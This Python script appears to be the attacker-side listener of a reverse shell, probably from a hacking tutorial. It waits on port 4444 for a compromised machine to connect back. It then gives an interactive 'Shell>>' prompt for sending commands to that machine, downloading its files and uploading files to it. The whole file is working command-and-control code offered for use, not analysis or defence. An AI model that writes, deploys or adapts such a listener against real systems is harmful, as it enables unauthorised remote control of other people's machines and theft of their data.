import socket
import json
import base64


# JSON send
def send(data):
    json_data = json.dumps(data)
    client.send(json_data.encode())


# JSON receive
def recieve():
    data = ""
    while True:
        try:
            data += client.recv(1024).decode()
            return json.loads(data)
        except ValueError:
            continue


# Write file decoded
def write_file(path, data):
    with open(path, "wb") as f:
        f.write(base64.b64decode(data))


# Read file encoded
def read_file(path):
    with open(path, "rb") as f:
        return base64.b64encode(f.read()).decode()


def run():
    while True:
        command = input("Shell>> ")

        send(command)

        if command == "exit":
            break

        if command.startswith("download "):
            file_data = recieve()
            if file_data.startswith("[-]"):
                print(file_data)
            else:
                filename = command.split(" ", 1)[1]
                write_file(filename, file_data)
                print("[+] Downloaded successfully")
            continue

        if command.startswith("upload "):
            filename = command.split(" ", 1)[1]
            try:
                file_data = read_file(filename)
                send(file_data)
            except:
                print("[-] Upload failed")
                send("ERR")
            continue

        result = recieve()
        print(result)


# Server setup
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("0.0.0.0", 4444))  # Listen on all interfaces
listener.listen(1)

print("[+] Waiting for incoming connection...")
client, addr = listener.accept()
print(f"[+] Connection established with {addr}")

run()
